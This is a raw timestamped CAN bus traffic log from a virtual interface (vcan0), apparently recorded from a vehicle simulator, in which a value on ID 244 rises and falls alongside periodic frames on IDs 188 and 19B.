vcan0 244#00000019AC (1608926667.837300) vcan0 244#00000019BE (1608926667.849350) vcan0 244#00000019D0 (1608926667.863374) vcan0 244#00000019E2 (1608926667.880747) vcan0 244#00000019F4 (1608926667.894983) vcan0 244#0000001A06 (1608926667.908768) vcan0 244#0000001A18 (1608926667.922387) vcan0 244#0000001A2A (1608926667.934650) vcan0 244#0000001A3C (1608926667.948235) vcan0 244#0000001A4F (1608926667.961636) vcan0 244#0000001A61 (1608926667.976630) vcan0 244#0000001A73 (1608926667.989755) vcan0 244#0000001A85 (1608926668.007205) vcan0 244#0000001A97 (1608926668.022718) vcan0 244#0000001AA9 (1608926668.022800) vcan0 188#00000000 (1608926668.034742) vcan0 244#0000001ABB (1608926668.047299) vcan0 244#0000001ACD (1608926668.062827) vcan0 244#0000001ADF (1608926668.075039) vcan0 244#0000001AF1 (1608926668.088475) vcan0 244#0000001B04 (1608926668.100045) vcan0 244#0000001B16 (1608926668.112133) vcan0 244#0000001B28 (1608926668.124152) vcan0 244#0000001B3A (1608926668.136430) vcan0 244#0000001B4C (1608926668.149044) vcan0 244#0000001B5E (1608926668.165051) vcan0 244#0000001B70 (1608926668.177303) vcan0 244#0000001B82 (1608926668.188838) vcan0 244#0000001B94 (1608926668.201136) vcan0 244#0000001BA7 (1608926668.212991) vcan0 244#0000001BB9 (1608926668.225218) vcan0 244#0000001BCB (1608926668.237669) vcan0 244#0000001BDD (1608926668.252777) vcan0 244#0000001BEF (1608926668.266329) vcan0 244#0000001C01 (1608926668.281019) vcan0 244#0000001C13 (1608926668.293830) vcan0 244#0000001C25 (1608926668.308965) vcan0 244#0000001C37 (1608926668.321655) vcan0 244#0000001C49 (1608926668.335800) vcan0 244#0000001C5C (1608926668.348471) vcan0 244#0000001C6E (1608926668.362930) vcan0 244#0000001C80 (1608926668.375721) vcan0 244#0000001C92 (1608926668.387869) vcan0 244#0000001CA4 (1608926668.401207) vcan0 244#0000001CB6 (1608926668.412876) vcan0 244#0000001CC8 (1608926668.424010) vcan0 244#0000001CDA (1608926668.435736) vcan0 244#0000001CEC (1608926668.448417) vcan0 244#0000001CFF (1608926668.461467) vcan0 244#0000001D11 (1608926668.473596) vcan0 244#0000001D23 (1608926668.485834) vcan0 244#0000001D35 (1608926668.498150) vcan0 244#0000001D47 (1608926668.510172) vcan0 244#0000001D59 (1608926668.523816) vcan0 244#0000001D6B (1608926668.530024) vcan0 188#00000000 (1608926668.537152) vcan0 244#0000001D7D (1608926668.550302) vcan0 244#0000001D8F (1608926668.562053) vcan0 244#0000001DA1 (1608926668.574099) vcan0 244#0000001DB4 (1608926668.586497) vcan0 244#0000001DC6 (1608926668.598185) vcan0 244#0000001DD8 (1608926668.610208) vcan0 244#0000001DEA (1608926668.622159) vcan0 244#0000001DFC (1608926668.634065) vcan0 244#0000001E0E (1608926668.645574) vcan0 244#0000001E20 (1608926668.658760) vcan0 244#0000001E32 (1608926668.670324) vcan0 244#0000001E44 (1608926668.682420) vcan0 244#0000001E57 (1608926668.694570) vcan0 244#0000001E69 (1608926668.706433) vcan0 244#0000001E7B (1608926668.718612) vcan0 244#0000001E8D (1608926668.731791) vcan0 244#0000001E9F (1608926668.744984) vcan0 244#0000001EB1 (1608926668.759171) vcan0 244#0000001EC3 (1608926668.774006) vcan0 244#0000001ED5 (1608926668.789911) vcan0 244#0000001EE7 (1608926668.805444) vcan0 244#0000001EF9 (1608926668.820035) vcan0 244#0000001F0C (1608926668.832804) vcan0 244#0000001F1E (1608926668.846185) vcan0 244#0000001F30 (1608926668.864609) vcan0 244#0000001F42 (1608926668.878660) vcan0 244#0000001F54 (1608926668.892376) vcan0 244#0000001F66 (1608926668.908891) vcan0 244#0000001F78 (1608926668.921480) vcan0 244#0000001F8A (1608926668.934413) vcan0 244#0000001F9C (1608926668.947002) vcan0 244#0000001FAF (1608926668.959289) vcan0 244#0000001FC1 (1608926668.972189) vcan0 244#0000001FD3 (1608926668.984094) vcan0 244#0000001FE5 (1608926668.997354) vcan0 244#0000001FF7 (1608926669.008884) vcan0 244#0000002009 (1608926669.022318) vcan0 244#000000201B (1608926669.036721) vcan0 244#000000202D (1608926669.036851) vcan0 188#00000000 (1608926669.048687) vcan0 244#000000203F (1608926669.063756) vcan0 244#0000002051 (1608926669.076301) vcan0 244#0000002064 (1608926669.088757) vcan0 244#0000002076 (1608926669.102290) vcan0 244#0000002088 (1608926669.118028) vcan0 244#000000209A (1608926669.130185) vcan0 244#00000020AC (1608926669.142715) vcan0 244#00000020BE (1608926669.155210) vcan0 244#00000020D0 (1608926669.167820) vcan0 244#00000020E2 (1608926669.180667) vcan0 244#00000020F4 (1608926669.192774) vcan0 244#0000002107 (1608926669.204817) vcan0 244#0000002119 (1608926669.216920) vcan0 244#000000212B (1608926669.228566) vcan0 244#000000213D (1608926669.241887) vcan0 244#000000214F (1608926669.254453) vcan0 244#0000002161 (1608926669.266417) vcan0 244#0000002173 (1608926669.279118) vcan0 244#0000002185 (1608926669.291948) vcan0 244#0000002197 (1608926669.304569) vcan0 244#00000021A9 (1608926669.317107) vcan0 244#00000021BC (1608926669.330652) vcan0 244#00000021CE (1608926669.344767) vcan0 244#00000021E0 (1608926669.356616) vcan0 244#00000021F2 (1608926669.369415) vcan0 244#0000002204 (1608926669.384059) vcan0 244#0000002216 (1608926669.396690) vcan0 244#0000002228 (1608926669.408761) vcan0 244#000000223A (1608926669.420317) vcan0 244#000000224C (1608926669.432721) vcan0 244#000000225E (1608926669.446707) vcan0 244#0000002271 (1608926669.458422) vcan0 244#0000002283 (1608926669.471909) vcan0 244#0000002295 (1608926669.483837) vcan0 244#00000022A7 (1608926669.496141) vcan0 244#00000022B9 (1608926669.511150) vcan0 244#00000022CB (1608926669.523896) vcan0 244#00000022DD (1608926669.535840) vcan0 244#00000022EF (1608926669.544057) vcan0 188#00000000 (1608926669.550892) vcan0 244#0000002301 (1608926669.564389) vcan0 244#0000002314 (1608926669.577621) vcan0 244#0000002326 (1608926669.592196) vcan0 244#0000002338 (1608926669.613700) vcan0 244#000000234A (1608926669.627816) vcan0 244#000000235C (1608926669.641588) vcan0 244#000000236E (1608926669.656056) vcan0 244#0000002380 (1608926669.670674) vcan0 244#0000002392 (1608926669.685073) vcan0 244#00000023A4 (1608926669.699353) vcan0 244#00000023B6 (1608926669.711892) vcan0 244#00000023C9 (1608926669.727589) vcan0 244#00000023DB (1608926669.740095) vcan0 244#00000023ED (1608926669.752060) vcan0 244#00000023FF (1608926669.764998) vcan0 244#0000002411 (1608926669.780990) vcan0 244#0000002423 (1608926669.794068) vcan0 244#0000002435 (1608926669.806411) vcan0 244#0000002447 (1608926669.818767) vcan0 244#0000002459 (1608926669.832352) vcan0 244#000000246C (1608926669.846850) vcan0 244#000000247E (1608926669.859136) vcan0 244#0000002490 (1608926669.872574) vcan0 244#00000024A2 (1608926669.889029) vcan0 244#00000024B4 (1608926669.902236) vcan0 244#00000024C6 (1608926669.915077) vcan0 244#00000024D8 (1608926669.928217) vcan0 244#00000024EA (1608926669.940368) vcan0 244#00000024FC (1608926669.956386) vcan0 244#000000250E (1608926669.968771) vcan0 244#0000002521 (1608926669.981843) vcan0 244#0000002533 (1608926669.996978) vcan0 244#0000002545 (1608926670.010991) vcan0 244#0000002557 (1608926670.024420) vcan0 244#0000002569 (1608926670.033550) vcan0 244#000000257B (1608926670.046401) vcan0 244#000000258D (1608926670.046480) vcan0 188#00000000 (1608926670.058954) vcan0 244#000000259F (1608926670.072443) vcan0 244#00000025B1 (1608926670.085312) vcan0 244#00000025C4 (1608926670.097574) vcan0 244#00000025D6 (1608926670.109513) vcan0 244#00000025E8 (1608926670.121486) vcan0 244#00000025FA (1608926670.133713) vcan0 244#000000260C (1608926670.145841) vcan0 244#000000261E (1608926670.159895) vcan0 244#0000002630 (1608926670.172400) vcan0 244#0000002642 (1608926670.184064) vcan0 244#0000002654 (1608926670.196255) vcan0 244#0000002666 (1608926670.209323) vcan0 244#0000002679 (1608926670.221905) vcan0 244#000000268B (1608926670.236630) vcan0 244#000000269D (1608926670.248752) vcan0 244#00000026AF (1608926670.260687) vcan0 244#00000026C1 (1608926670.273444) vcan0 244#00000026D3 (1608926670.285534) vcan0 244#00000026E5 (1608926670.298885) vcan0 244#00000026F7 (1608926670.313237) vcan0 244#0000002709 (1608926670.325653) vcan0 244#000000271C (1608926670.339565) vcan0 244#000000272E (1608926670.354679) vcan0 244#0000002740 (1608926670.366428) vcan0 244#0000002752 (1608926670.379229) vcan0 244#0000002764 (1608926670.392539) vcan0 244#0000002776 (1608926670.406578) vcan0 244#0000002788 (1608926670.418821) vcan0 244#000000279A (1608926670.432536) vcan0 244#00000027AC (1608926670.444884) vcan0 244#00000027BE (1608926670.457657) vcan0 244#00000027D1 (1608926670.472278) vcan0 244#00000027E3 (1608926670.485415) vcan0 244#00000027F5 (1608926670.498182) vcan0 244#0000002807 (1608926670.510704) vcan0 244#00000027F5 (1608926670.524690) vcan0 244#00000027E3 (1608926670.537479) vcan0 244#00000027D1 (1608926670.550393) vcan0 244#00000027BE (1608926670.550541) vcan0 188#00000000 (1608926670.564915) vcan0 244#00000027AC (1608926670.578731) vcan0 244#000000279A (1608926670.591474) vcan0 244#0000002788 (1608926670.605276) vcan0 244#0000002776 (1608926670.619210) vcan0 244#0000002764 (1608926670.631834) vcan0 244#0000002752 (1608926670.644563) vcan0 244#0000002740 (1608926670.658749) vcan0 244#000000272E (1608926670.672351) vcan0 244#000000271C (1608926670.685927) vcan0 244#0000002709 (1608926670.699175) vcan0 244#00000026F7 (1608926670.712949) vcan0 244#00000026E5 (1608926670.726646) vcan0 244#00000026D3 (1608926670.740231) vcan0 244#00000026C1 (1608926670.754231) vcan0 244#00000026AF (1608926670.769495) vcan0 244#000000269D (1608926670.784658) vcan0 244#000000268B (1608926670.800631) vcan0 244#0000002679 (1608926670.813063) vcan0 244#0000002666 (1608926670.824913) vcan0 244#0000002654 (1608926670.837161) vcan0 244#0000002642 (1608926670.852210) vcan0 244#0000002630 (1608926670.865494) vcan0 244#000000261E (1608926670.878980) vcan0 244#000000260C (1608926670.892108) vcan0 244#00000025FA (1608926670.905075) vcan0 244#00000025E8 (1608926670.919871) vcan0 244#00000025D6 (1608926670.932534) vcan0 244#00000025C4 (1608926670.944655) vcan0 244#00000025B1 (1608926670.957916) vcan0 244#000000259F (1608926670.972206) vcan0 244#000000258D (1608926670.986807) vcan0 244#000000257B (1608926670.999675) vcan0 244#0000002569 (1608926671.013352) vcan0 244#0000002557 (1608926671.028499) vcan0 244#0000002545 (1608926671.042372) vcan0 244#0000002533 (1608926671.054934) vcan0 244#0000002521 (1608926671.055065) vcan0 188#00000000 (1608926671.068498) vcan0 244#000000250E (1608926671.082217) vcan0 244#00000024FC (1608926671.095883) vcan0 244#00000024EA (1608926671.109059) vcan0 244#00000024D8 (1608926671.121451) vcan0 244#00000024C6 (1608926671.122520) vcan0 19B#00000F000000 (1608926671.136388) vcan0 244#00000024B4 (1608926671.149383) vcan0 244#00000024A2 (1608926671.166316) vcan0 244#0000002490 (1608926671.181322) vcan0 244#000000247E (1608926671.194391) vcan0 244#000000246C (1608926671.206702) vcan0 244#0000002459 (1608926671.220949) vcan0 244#0000002447 (1608926671.234507) vcan0 244#0000002435 (1608926671.247731) vcan0 244#0000002423 (1608926671.259914) vcan0 244#0000002411 (1608926671.271838) vcan0 244#00000023FF (1608926671.284743) vcan0 244#00000023ED (1608926671.300478) vcan0 244#00000023DB (1608926671.312885) vcan0 244#00000023C9 (1608926671.327717) vcan0 244#00000023B6 (1608926671.339908) vcan0 244#00000023A4 (1608926671.353974) vcan0 244#0000002392 (1608926671.367299) vcan0 244#0000002380 (1608926671.380091) vcan0 244#000000236E (1608926671.392891) vcan0 244#000000235C (1608926671.406546) vcan0 244#000000234A (1608926671.419682) vcan0 244#0000002338 (1608926671.432553) vcan0 244#0000002326 (1608926671.444511) vcan0 244#0000002314 (1608926671.458329) vcan0 244#0000002301 (1608926671.471763) vcan0 244#00000022EF (1608926671.484840) vcan0 244#00000022DD (1608926671.497857) vcan0 244#00000022CB (1608926671.510739) vcan0 244#00000022B9 (1608926671.524650) vcan0 244#00000022A7 (1608926671.538038) vcan0 244#0000002295 (1608926671.551043) vcan0 244#0000002283 (1608926671.558329) vcan0 188#00000000 (1608926671.564019) vcan0 244#0000002271 (1608926671.577062) vcan0 244#000000225E (1608926671.590170) vcan0 244#000000224C (1608926671.602718) vcan0 244#000000223A (1608926671.615301) vcan0 244#0000002228 (1608926671.627911) vcan0 244#0000002216 (1608926671.640587) vcan0 244#0000002204 (1608926671.652471) vcan0 244#00000021F2 (1608926671.664685) vcan0 244#00000021E0 (1608926671.676369) vcan0 244#00000021CE (1608926671.688390) vcan0 244#00000021BC (1608926671.701848) vcan0 244#00000021A9 (1608926671.716503) vcan0 244#0000002197 (1608926671.731043) vcan0 244#0000002185 (1608926671.743511) vcan0 244#0000002173 (1608926671.756248) vcan0 244#0000002161 (1608926671.769293) vcan0 244#000000214F (1608926671.783123) vcan0 244#000000213D (1608926671.795941) vcan0 244#000000212B (1608926671.807808) vcan0 244#0000002119 (1608926671.819934) vcan0 244#0000002107 (1608926671.833289) vcan0 244#00000020F4 (1608926671.846431) vcan0 244#00000020E2 (1608926671.858725) vcan0 244#00000020D0 (1608926671.870511) vcan0 244#00000020BE (1608926671.884546) vcan0 244#00000020AC (1608926671.897262) vcan0 244#000000209A (1608926671.910919) vcan0 244#0000002088 (1608926671.924760) vcan0 244#0000002076 (1608926671.938437) vcan0 244#0000002064 (1608926671.949556) vcan0 244#0000002051 (1608926671.960945) vcan0 244#000000203F (1608926671.973644) vcan0 244#000000202D (1608926671.987743) vcan0 244#000000201B (1608926672.000913) vcan0 244#0000002009 (1608926672.020136) vcan0 244#0000001FF7 (1608926672.034983) vcan0 244#0000001FE5 (1608926672.049268) vcan0 244#0000001FD3 (1608926672.063024) vcan0 244#0000001FC1 (1608926672.063221) vcan0 188#00000000 (1608926672.075051) vcan0 244#0000001FAF (1608926672.087487) vcan0 244#0000001F9C (1608926672.100297) vcan0 244#0000001F8A (1608926672.113058) vcan0 244#0000001F78 (1608926672.130394) vcan0 244#0000001F66 (1608926672.143305) vcan0 244#0000001F54 (1608926672.155322) vcan0 244#0000001F42 (1608926672.167819) vcan0 244#0000001F30 (1608926672.180539) vcan0 244#0000001F1E (1608926672.192038) vcan0 244#0000001F0C (1608926672.205937) vcan0 244#0000001EF9 (1608926672.217667) vcan0 244#0000001EE7 (1608926672.232074) vcan0 244#0000001ED5 (1608926672.244624) vcan0 244#0000001EC3 (1608926672.257580) vcan0 244#0000001EB1 (1608926672.269946) vcan0 244#0000001E9F (1608926672.282334) vcan0 244#0000001E8D (1608926672.294119) vcan0 244#0000001E7B (1608926672.306248) vcan0 244#0000001E69 (1608926672.318854) vcan0 244#0000001E57 (1608926672.330887) vcan0 244#0000001E44 (1608926672.342914) vcan0 244#0000001E32 (1608926672.353909) vcan0 244#0000001E20 (1608926672.365206) vcan0 244#0000001E0E (1608926672.378684) vcan0 244#0000001DFC (1608926672.391456) vcan0 244#0000001DEA (1608926672.403504) vcan0 244#0000001DD8 (1608926672.415773) vcan0 244#0000001DC6 (1608926672.426994) vcan0 244#0000001DB4 (1608926672.438550) vcan0 244#0000001DA1 (1608926672.450479) vcan0 244#0000001D8F (1608926672.461639) vcan0 244#0000001D7D (1608926672.474618) vcan0 244#0000001D6B (1608926672.487169) vcan0 244#0000001D59 (1608926672.500255) vcan0 244#0000001D47 (1608926672.512820) vcan0 244#0000001D35 (1608926672.523946) vcan0 244#0000001D23 (1608926672.538452) vcan0 244#0000001D11 (1608926672.549998) vcan0 244#0000001CFF (1608926672.562307) vcan0 244#0000001CEC (1608926672.568871) vcan0 188#00000000 (1608926672.575798) vcan0 244#0000001CDA (1608926672.590392) vcan0 244#0000001CC8 (1608926672.603076) vcan0 244#0000001CB6 (1608926672.615745) vcan0 244#0000001CA4 (1608926672.627908) vcan0 244#0000001C92 (1608926672.641686) vcan0 244#0000001C80 (1608926672.653667) vcan0 244#0000001C6E (1608926672.664846) vcan0 244#0000001C5C (1608926672.677531) vcan0 244#0000001C49 (1608926672.689450) vcan0 244#0000001C37 (1608926672.701363) vcan0 244#0000001C25 (1608926672.713398) vcan0 244#0000001C13 (1608926672.726110) vcan0 244#0000001C01 (1608926672.738303) vcan0 244#0000001BEF (1608926672.751220) vcan0 244#0000001BDD (1608926672.763886) vcan0 244#0000001BCB (1608926672.778343) vcan0 244#0000001BB9 (1608926672.790315) vcan0 244#0000001BA7 (1608926672.804650) vcan0 244#0000001B94 (1608926672.820553) vcan0 244#0000001B82 (1608926672.832029) vcan0 244#0000001B70 (1608926672.843448) vcan0 244#0000001B5E (1608926672.856913) vcan0 244#0000001B4C (1608926672.870276) vcan0 244#0000001B3A (1608926672.882921) vcan0 244#0000001B28 (1608926672.896547) vcan0 244#0000001B16 (1608926672.909833) vcan0 244#0000001B04 (1608926672.925049) vcan0 244#0000001AF1 (1608926672.937707) vcan0 244#0000001ADF (1608926672.952000) vcan0 244#0000001ACD (1608926672.966484) vcan0 244#0000001ABB (1608926672.979338) vcan0 244#0000001AA9 (1608926672.993464) vcan0 244#0000001A97 (1608926673.007177) vcan0 244#0000001A85 (1608926673.019351) vcan0 244#0000001A73 (1608926673.037660) vcan0 244#0000001A61 (1608926673.049752) vcan0 244#0000001A4F (1608926673.066467) vcan0 244#0000001A3C (1608926673.072611) vcan0 188#00000000 (1608926673.079316) vcan0 244#0000001A2A (1608926673.091894) vcan0 244#0000001A18 (1608926673.106117) vcan0 244#0000001A06 (1608926673.119079) vcan0 244#00000019F4 (1608926673.132476) vcan0 244#00000019E2 (1608926673.145495) vcan0 244#00000019D0 (1608926673.157900) vcan0 244#00000019BE (1608926673.170294) vcan0 244#00000019AC (1608926673.182546) vcan0 244#0000001999 (1608926673.196032) vcan0 244#0000001987 (1608926673.211084) vcan0 244#0000001975 (1608926673.225687) vcan0 244#0000001963 (1608926673.238954) vcan0 244#0000001951 (1608926673.252194) vcan0 244#000000193F (1608926673.265239) vcan0 244#000000192D (1608926673.279470) vcan0 244#000000191B (1608926673.292902) vcan0 244#0000001909 (1608926673.306423) vcan0 244#00000018F7 (1608926673.318399) vcan0 244#00000018E4 (1608926673.331120) vcan0 244#00000018D2 (1608926673.345535) vcan0 244#00000018C0 (1608926673.358241) vcan0 244#00000018AE (1608926673.372231) vcan0 244#000000189C (1608926673.384584) vcan0 244#000000188A (1608926673.397094) vcan0 244#0000001878 (1608926673.409030) vcan0 244#0000001866 (1608926673.421360) vcan0 244#0000001854 (1608926673.434575) vcan0 244#0000001841 (1608926673.447180) vcan0 244#000000182F (1608926673.459777) vcan0 244#000000181D (1608926673.473604) vcan0 244#000000180B (1608926673.488424) vcan0 244#00000017F9 (1608926673.500701) vcan0 244#00000017E7 (1608926673.512733) vcan0 244#00000017D5 (1608926673.524142) vcan0 244#00000017C3 (1608926673.535638) vcan0 244#00000017B1 (1608926673.549194) vcan0 244#000000179F (1608926673.561709) vcan0 244#000000178C (1608926673.573881) vcan0 244#000000177A (1608926673.579853) vcan0 188#00000000 (1608926673.585737) vcan0 244#0000001768 (1608926673.597515) vcan0 244#0000001756 (1608926673.610972) vcan0 244#0000001744 (1608926673.624407) vcan0 244#0000001732 (1608926673.636393) vcan0 244#0000001720 (1608926673.649100) vcan0 244#000000170E (1608926673.662494) vcan0 244#00000016FC (1608926673.674747) vcan0 244#00000016EA (1608926673.688368) vcan0 244#00000016D7 (1608926673.701832) vcan0 244#00000016C5 (1608926673.714968) vcan0 244#00000016B3 (1608926673.728991) vcan0 244#00000016A1 (1608926673.743085) vcan0 244#000000168F (1608926673.755868) vcan0 244#000000167D (1608926673.769012) vcan0 244#000000166B (1608926673.781788) vcan0 244#0000001659 (1608926673.794562) vcan0 244#0000001647 (1608926673.809270) vcan0 244#0000001634 (1608926673.822000) vcan0 244#0000001622 (1608926673.834026) vcan0 244#0000001610 (1608926673.846797) vcan0 244#00000015FE (1608926673.857842) vcan0 244#00000015EC (1608926673.870176) vcan0 244#00000015DA (1608926673.882263) vcan0 244#00000015C8 (1608926673.894499) vcan0 244#00000015B6 (1608926673.906036) vcan0 244#00000015A4 (1608926673.917973) vcan0 244#0000001592 (1608926673.929598) vcan0 244#000000157F (1608926673.943048) vcan0 244#000000156D (1608926673.954755) vcan0 244#000000155B (1608926673.966800) vcan0 244#0000001549 (1608926673.978376) vcan0 244#0000001537 (1608926673.993763) vcan0 244#0000001525 (1608926674.009698) vcan0 244#0000001513 (1608926674.022692) vcan0 244#0000001501 (1608926674.034043) vcan0 244#00000014EF (1608926674.048269) vcan0 244#00000014DC (1608926674.061162) vcan0 244#00000014CA (1608926674.074258) vcan0 244#00000014B8 (1608926674.086283) vcan0 244#00000014A6 (1608926674.086447) vcan0 188#00000000 (1608926674.092148) vcan0 19B#000000000000 (1608926674.099476) vcan0 244#0000001494 (1608926674.112144) vcan0 244#0000001482 (1608926674.124485) vcan0 244#0000001470 (1608926674.136535) vcan0 244#000000145E (1608926674.150215) vcan0 244#000000144C (1608926674.161710) vcan0 244#000000143A (1608926674.174097) vcan0 244#0000001427 (1608926674.187301) vcan0 244#0000001415 (1608926674.199972) vcan0 244#0000001403 (1608926674.212155) vcan0 244#00000013F1 (1608926674.224403) vcan0 244#00000013DF (1608926674.237943) vcan0 244#00000013CD (1608926674.251118) vcan0 244#00000013BB (1608926674.263976) vcan0 244#00000013A9 (1608926674.277360) vcan0 244#0000001397 (1608926674.289102) vcan0 244#0000001384 (1608926674.301323) vcan0 244#0000001372 (1608926674.313461) vcan0 244#0000001360 (1608926674.325711) vcan0 244#000000134E (1608926674.340856) vcan0 244#000000133C (1608926674.352380) vcan0 244#000000132A (1608926674.364591) vcan0 244#0000001318 (1608926674.376558) vcan0 244#0000001306 (1608926674.388256) vcan0 244#00000012F4 (1608926674.400590) vcan0 244#00000012E2 (1608926674.412395) vcan0 244#00000012CF (1608926674.425051) vcan0 244#00000012BD (1608926674.437193) vcan0 244#00000012AB (1608926674.450810) vcan0 244#0000001299 (1608926674.463821) vcan0 244#0000001287 (1608926674.477497) vcan0 244#0000001275 (1608926674.492109) vcan0 244#0000001263 (1608926674.504228) vcan0 244#0000001251 (1608926674.517180) vcan0 244#000000123F (1608926674.529425) vcan0 244#000000122C (1608926674.541581) vcan0 244#000000121A (1608926674.553676) vcan0 244#0000001208 (1608926674.566042) vcan0 244#00000011F6 (1608926674.577438) vcan0 244#00000011E4 (1608926674.589815) vcan0 244#00000011D2 (1608926674.589954) vcan0 188#00000000 (1608926674.602411) vcan0 244#00000011C0 (1608926674.616363) vcan0 244#00000011AE (1608926674.628999) vcan0 244#000000119C (1608926674.641420) vcan0 244#000000118A (1608926674.655656) vcan0 244#0000001177 (1608926674.667537) vcan0 244#0000001165 (1608926674.679672) vcan0 244#0000001153 (1608926674.691691) vcan0 244#0000001141 (1608926674.703835) vcan0 244#000000112F (1608926674.716169) vcan0 244#000000111D (1608926674.728846) vcan0 244#000000110B (1608926674.741696) vcan0 244#00000010F9 (1608926674.753914) vcan0 244#00000010E7 (1608926674.765995) vcan0 244#00000010D4 (1608926674.778087) vcan0 244#00000010C2 (1608926674.790088) vcan0 244#00000010B0 (1608926674.802116) vcan0 244#000000109E (1608926674.815598) vcan0 244#000000108C (1608926674.828169) vcan0 244#000000107A (1608926674.839759) vcan0 244#0000001068 (1608926674.854999) vcan0 244#0000001056 (1608926674.867556) vcan0 244#0000001044 (1608926674.880365) vcan0 244#0000001032 (1608926674.894720) vcan0 244#000000101F (1608926674.910965) vcan0 244#000000100D (1608926674.924169) vcan0 244#0000000FFB (1608926674.938131) vcan0 244#0000000FE9 (1608926674.951003) vcan0 244#0000000FD7 (1608926674.964086) vcan0 244#0000000FC5 (1608926674.977186) vcan0 244#0000000FB3 (1608926674.992136) vcan0 244#0000000FA1 (1608926675.005780) vcan0 244#0000000F8F (1608926675.020164) vcan0 244#0000000F7C (1608926675.040383) vcan0 244#0000000F6A (1608926675.053859) vcan0 244#0000000F58 (1608926675.065655) vcan0 244#0000000F46 (1608926675.079421) vcan0 244#0000000F34 (1608926675.092864) vcan0 244#0000000F22 (1608926675.099853) vcan0 188#00000000 (1608926675.106900) vcan0 244#0000000F10 (1608926675.120475) vcan0 244#0000000EFE (1608926675.134017) vcan0 244#0000000EEC (1608926675.147023) vcan0 244#0000000EDA (1608926675.160161) vcan0 244#0000000EC7 (1608926675.174036) vcan0 244#0000000EB5 (1608926675.187399) vcan0 244#0000000EA3 (1608926675.200131) vcan0 244#0000000E91 (1608926675.213333) vcan0 244#0000000E7F (1608926675.226778) vcan0 244#0000000E6D (1608926675.240002) vcan0 244#0000000E5B (1608926675.253077) vcan0 244#0000000E49 (1608926675.264845) vcan0 244#0000000E37 (1608926675.278638) vcan0 244#0000000E24 (1608926675.292647) vcan0 244#0000000E12 (1608926675.305756) vcan0 244#0000000E00 (1608926675.319780) vcan0 244#0000000DEE (1608926675.332829) vcan0 244#0000000DDC (1608926675.346693) vcan0 244#0000000DCA (1608926675.360735) vcan0 244#0000000DB8 (1608926675.373226) vcan0 244#0000000DA6 (1608926675.387119) vcan0 244#0000000D94 (1608926675.400790) vcan0 244#0000000D82 (1608926675.414684) vcan0 244#0000000D6F (1608926675.427297) vcan0 244#0000000D5D (1608926675.441057) vcan0 244#0000000D4B (1608926675.455478) vcan0 244#0000000D39 (1608926675.468629) vcan0 244#0000000D27 (1608926675.482045) vcan0 244#0000000D15 (1608926675.495500) vcan0 244#0000000D03 (1608926675.508407) vcan0 244#0000000CF1 (1608926675.522602) vcan0 244#0000000CDF (1608926675.536183) vcan0 244#0000000CCD (1608926675.549829) vcan0 244#0000000CBA (1608926675.566476) vcan0 244#0000000CA8 (1608926675.579080) vcan0 244#0000000C96 (1608926675.591286) vcan0 244#0000000C84 (1608926675.604883) vcan0 244#0000000C72 (1608926675.605010) vcan0 188#00000000 (1608926675.620364) vcan0 244#0000000C60 (1608926675.632038) vcan0 244#0000000C4E (1608926675.644360) vcan0 244#0000000C3C (1608926675.657590) vcan0 244#0000000C2A (1608926675.671891) vcan0 244#0000000C17 (1608926675.684430) vcan0 244#0000000C05 (1608926675.699698) vcan0 244#0000000BF3 (1608926675.711869) vcan0 244#0000000BE1 (1608926675.726028) vcan0 244#0000000BCF (1608926675.738169) vcan0 244#0000000BBD (1608926675.751739) vcan0 244#0000000BAB (1608926675.764950) vcan0 244#0000000B99 (1608926675.776847) vcan0 244#0000000B87 (1608926675.790070) vcan0 244#0000000B75 (1608926675.805832) vcan0 244#0000000B62 (1608926675.818390) vcan0 244#0000000B50 (1608926675.832246) vcan0 244#0000000B3E (1608926675.844797) vcan0 244#0000000B2C (1608926675.856495) vcan0 244#0000000B1A (1608926675.868546) vcan0 244#0000000B08 (1608926675.881581) vcan0 244#0000000AF6 (1608926675.894173) vcan0 244#0000000AE4 (1608926675.906893) vcan0 244#0000000AD2 (1608926675.922460) vcan0 244#0000000ABF (1608926675.936664) vcan0 244#0000000AAD (1608926675.950939) vcan0 244#0000000A9B (1608926675.964954) vcan0 244#0000000A89 (1608926675.980365) vcan0 244#0000000A77 (1608926675.992941) vcan0 244#0000000A65 (1608926676.004654) vcan0 244#0000000A53 (1608926676.018337) vcan0 244#0000000A41 (1608926676.030866) vcan0 244#0000000A2F (1608926676.045417) vcan0 244#0000000A1D (1608926676.057970) vcan0 244#0000000A0A (1608926676.072537) vcan0 244#00000009F8 (1608926676.086263) vcan0 244#00000009E6 (1608926676.097640) vcan0 244#00000009D4 (1608926676.110002) vcan0 244#00000009C2 (1608926676.110132) vcan0 188#00000000 (1608926676.121670) vcan0 244#00000009B0 (1608926676.133855) vcan0 244#000000099E (1608926676.145867) vcan0 244#000000098C (1608926676.158230) vcan0 244#000000097A (1608926676.173241) vcan0 244#0000000967 (1608926676.185079) vcan0 244#0000000955 (1608926676.196054) vcan0 244#0000000943 (1608926676.208519) vcan0 244#0000000931 (1608926676.220359) vcan0 244#000000091F (1608926676.232387) vcan0 244#000000090D (1608926676.244892) vcan0 244#00000008FB (1608926676.257684) vcan0 244#00000008E9 (1608926676.270540) vcan0 244#00000008D7 (1608926676.282594) vcan0 244#00000008C5 (1608926676.294615) vcan0 244#00000008B2 (1608926676.306099) vcan0 244#00000008A0 (1608926676.318302) vcan0 244#000000088E (1608926676.329997) vcan0 244#000000087C (1608926676.342788) vcan0 244#000000086A (1608926676.354995) vcan0 244#0000000858 (1608926676.366458) vcan0 244#0000000846 (1608926676.378232) vcan0 244#0000000834 (1608926676.390629) vcan0 244#0000000822 (1608926676.402213) vcan0 244#000000080F (1608926676.413409) vcan0 244#00000007FD (1608926676.425138) vcan0 244#00000007EB (1608926676.437556) vcan0 244#00000007D9 (1608926676.451601) vcan0 244#00000007C7 (1608926676.464508) vcan0 244#00000007B5 (1608926676.476666) vcan0 244#00000007A3 (1608926676.487977) vcan0 244#0000000791 (1608926676.500106) vcan0 244#000000077F (1608926676.513922) vcan0 244#000000076D (1608926676.525813) vcan0 244#000000075A (1608926676.538160) vcan0 244#0000000748 (1608926676.550366) vcan0 244#0000000736 (1608926676.563147) vcan0 244#0000000724 (1608926676.575497) vcan0 244#0000000712 (1608926676.587023) vcan0 244#0000000700 (1608926676.598652) vcan0 244#00000006EE (1608926676.611624) vcan0 244#00000006DC (1608926676.617537) vcan0 188#00000000 (1608926676.623894) vcan0 244#00000006CA (1608926676.636980) vcan0 244#00000006B7 (1608926676.651814) vcan0 244#00000006A5 (1608926676.664472) vcan0 244#0000000693 (1608926676.676432) vcan0 244#0000000681 (1608926676.689024) vcan0 244#000000066F (1608926676.701590) vcan0 244#000000065D (1608926676.714327) 